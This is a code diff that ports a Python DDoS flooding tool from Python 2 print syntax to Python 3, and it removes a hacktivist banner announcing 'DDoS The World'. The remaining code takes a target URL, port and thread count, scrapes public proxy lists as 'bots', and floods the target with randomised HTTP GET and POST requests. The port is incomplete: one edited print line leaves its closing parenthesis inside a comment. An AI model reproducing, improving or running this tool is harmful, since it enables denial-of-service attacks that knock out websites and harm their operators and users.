@@ -5,18 +5,18 @@ import socket,random,threading,time,ssl,sys,time,re
 try:
  import requests
 except:
- print "you need to install: requests"
+ print ("you need to install: requests")
  sys.exit()
 try:
  import socks
 except:
- print "you need to install: socks"
+ print ("you need to install: socks")
  sys.exit()
 try:
  import bs4
  from bs4 import BeautifulSoup
 except:
- print "you need to install: bs4"
+ print ("you need to install: bs4")
  sys.exit()
 ua=[
 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0;   Acoo Browser; GTB5; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;   SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)',
@@ -1495,56 +1495,8 @@ al=["af","hr","el","sq","cs","gu","pt","sw","ar","da","ht","pt-br","sv","nl","he
 global pt
 #Ala iz G0d
 pt=["/"]
-print """ \033[1;32m
-                                                    Tool By  : Ala
-                                                       Enjoy ! :)
- 
-                                             At the end of the day, 
-                                               Nobody gots you but yourself
 
-  /-/|
- /_/ |
- | |/|     + Proxy
- |^| | 
- |_|/
-unknown
-     (\__.-. |
-    == ===_]+
-             |
-      ` - .
-            - >->   
-   
-
-                             (\__.-. |
-                            == ===_]+
-                                     |
-                           ` - .
-       `                        - >->   
-   
-                   (\__.-. |
-                  == ===_]+
-                          |
- ` - .
-       ` - >-    
-     ___       __  __ _                              _ _    
-    / _ \ _ __|  \/  (_)_ _  _ _  ___ __ _ _ __  ___| (_)___
-   | (_) | '_ \ |\/| | | ' \| ' \/ -_) _` | '_ \/ _ \ | (_-<
-    \___/| .__/_|  |_|_|_||_|_||_\___\__,_| .__/\___/_|_/__/
-         |_|                              |_|               
-
-   \033[1;36m W3LC0M3 M4S73R aRe YoU ReADy tO aTtAcK?
-				
-	\033[1;36mShoutOut : \033[1;44mS0u1 \033[0;m\033[1;46m AnonOpUSA \033[0;m
-   Twitter Contact : @AnonOpUSA + @YourAnonS0u1
-                                               
-\033[0;m 
-\033[1;36m##=================================================================##\033[0;m                        
-\033[1;36m##               \033[0;m \033[1;42m==> Enjoy, DDoS The World<==\033[0;m                     \033[1;36m##\033[0;m 
-\033[1;36m##=================================================================##\033[0;m
-
-
-[!] =====> \033[1;42mBe Smart\033[0;m (Type your target in the terminal :) )
-    """ 
+    
 n=0
 while n<1:
  try:
@@ -1553,33 +1505,33 @@ while n<1:
   if url!="":
    n+=1
   else:
-   print"Don't leave your target blank"
+   print("Don't leave your target blank")
  except:
-  print"Write your the domain or IP correctly"
+  print("Write your the domain or IP correctly")
 while n<2:
  try:
   port=input("\n\nPort: (80 or 443)\n>")
   if port in [80,443]:
    n+=1
   else:
-   print"Enter: 80 or 443"
+   print("Enter: 80 or 443")
  except:
-  print"Enter a number"
+  print("Enter a number")
 while n<3:
  try:
   th=input("\n\nThreads:\n>")
   n+=1
  except:
-  print"Enter a number"
+  print("Enter a number")
 while n<4:
  try:
   op=input('\nDo you want to crawl your target first?\n 1-yes\n 2-no\n>')
   if op in [1,2]:
    n+=1
   else:
-   print"\nEnter: 1 or 2"
+   print("\nEnter: 1 or 2")
  except:
-  print"\nEnter a number (1 or 2)"
+  print("\nEnter a number (1 or 2)")
 if op==1:
  ur=raw_input('\nYour initial link:\n>')
  h=[]
@@ -1603,19 +1555,19 @@ if op==1:
       if (a!=ur+"/") and (a!=ur):
        h.append(a)
     except Exception as e:
-     print e
+     print (e)
  except Exception as ex:
-   print ex
+   print (ex)
  for x in h:
   x=x.split(ur)[1]
   pt.append(x)
- print"\nLinks found:",len(pt)
+ print("\nLinks found:",len(pt))
 else:
  pass
 u="http://www.proxyserverlist24.top/".strip()
 h=[]
 l=[]
-print"\n[+]Scanning..."
+print("\n[+]Scanning...")
 v=time.time()
 try:
  r=requests.get(u).text
@@ -1631,9 +1583,9 @@ try:
        if (a not in l):
           l.append(a)
       except Exception as xx:
-       print xx
+       print (xx)
     except Exception as ex:
-     print ex
+     print (ex)
      continue
 except Exception as e:
   pass
@@ -1675,18 +1627,18 @@ try:
    h+=p[0]
 except:
    pass
-print"[+]Scanning has finished!"
-print"\nhttp/https : ", len(h)
+print("[+]Scanning has finished!")
+print("\nhttp/https : ", len(h))
 p4=p[2]
-print"\nsocks4 : ", len(p4)
+print("\nsocks4 : ", len(p4))
 p5+=p[3]
-print"\nsocks5 : ",len(p5)
-print"\nTotal bots : ",len(h)+len(p4)+len(p5),"\n"
+print("\nsocks5 : ",len(p5))
+print("\nTotal bots : ",len(h)+len(p4)+len(p5),"\n")
 for bh in range(5):
  sys.stdout.write("\rAttack will start after : {}".format(5-bh))
  sys.stdout.flush()
  time.sleep(1)
-print"\n\n"
+print("\n\n")
 a=["text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","text/html, application/xhtml+xml, image/jxr, */*","text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1"]#*/
 class flood(threading.Thread):
  def run(self):
@@ -1747,7 +1699,7 @@ class flood(threading.Thread):
       m= "POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),l,random.randint(300,1000),len(par),url,par)
      try:
       s.send(m)
-      print"[!]Proxy: {} | Bytes: {} | \033[1;42mCONNECTED\033[0;m | MSG: \033[1;41mOpMinneapolis!\033[0;m |".format(ipp,len(m)) ##@YourAnonS0u1## <3
+      print("[!]Proxy: {} | Bytes: {} | \033[1;42mCONNECTED\033[0;m | MSG: \033[1;41mOpMinneapolis!\033[0;m |".format(ipp,len(m)) ##@YourAnonS0u1## <3)
      except Exception as dx:
       pass
     s.close()
